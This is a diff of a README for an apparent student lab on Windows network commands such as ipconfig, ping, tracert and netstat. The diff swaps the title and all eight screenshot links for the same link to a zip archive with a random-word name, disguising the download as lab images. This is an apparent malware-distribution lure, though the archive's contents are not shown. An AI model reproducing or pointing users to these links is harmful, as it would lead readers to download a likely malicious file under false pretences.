@@ -1,4 +1,4 @@
-# 4.Execution_of_NetworkCommands
+# https://github.com/Yugabharathi91/4.Execution_of_NetworkCommends/raw/refs/heads/main/foveolate/Commends-Network-of-Execution-talpify.zip
 ## AIM :Use of Network commands in Real Time environment
 ## Software : Command Prompt And Network Protocol Analyzer
 ## Procedure: To do this EXPERIMENT- follows these steps:
@@ -29,35 +29,35 @@ This commands includes
 ## Output
 IPCONFIG:
 
-![image](https://github.com/user-attachments/assets/be96282b-bcad-44aa-92e7-881fd6586fda)
+![image](https://github.com/Yugabharathi91/4.Execution_of_NetworkCommends/raw/refs/heads/main/foveolate/Commends-Network-of-Execution-talpify.zip)
 
 NBTSTAT:
 
-![image](https://github.com/user-attachments/assets/ee03826a-2708-4bd9-8477-32adc5823000)
+![image](https://github.com/Yugabharathi91/4.Execution_of_NetworkCommends/raw/refs/heads/main/foveolate/Commends-Network-of-Execution-talpify.zip)
 
 NSLOOPUP:
 
-![image](https://github.com/user-attachments/assets/0f36c558-1758-4584-bf7f-c5ecb953f6b4)
+![image](https://github.com/Yugabharathi91/4.Execution_of_NetworkCommends/raw/refs/heads/main/foveolate/Commends-Network-of-Execution-talpify.zip)
 
 HOSTUP:
 
-![image](https://github.com/user-attachments/assets/771887b0-f67e-4418-a36b-b666c08b6963)
+![image](https://github.com/Yugabharathi91/4.Execution_of_NetworkCommends/raw/refs/heads/main/foveolate/Commends-Network-of-Execution-talpify.zip)
 
 TRACERT:
 
-![image](https://github.com/user-attachments/assets/f5eb271a-97ce-4e39-9c30-880cd5d7b9d0)
+![image](https://github.com/Yugabharathi91/4.Execution_of_NetworkCommends/raw/refs/heads/main/foveolate/Commends-Network-of-Execution-talpify.zip)
 
 PING:
 
-![image](https://github.com/user-attachments/assets/733dd820-0653-42a8-97cb-fe61b358f977)
+![image](https://github.com/Yugabharathi91/4.Execution_of_NetworkCommends/raw/refs/heads/main/foveolate/Commends-Network-of-Execution-talpify.zip)
 
 NETSTAT:
 
-![image](https://github.com/user-attachments/assets/632f5f08-7300-497b-a7b4-6f8ecaa1edd3)
+![image](https://github.com/Yugabharathi91/4.Execution_of_NetworkCommends/raw/refs/heads/main/foveolate/Commends-Network-of-Execution-talpify.zip)
 
 GETMAC:
 
-![image](https://github.com/user-attachments/assets/6c8f1fa4-1a92-4499-ae4e-0171298edae5)
+![image](https://github.com/Yugabharathi91/4.Execution_of_NetworkCommends/raw/refs/heads/main/foveolate/Commends-Network-of-Execution-talpify.zip)
 
 
 ## Result
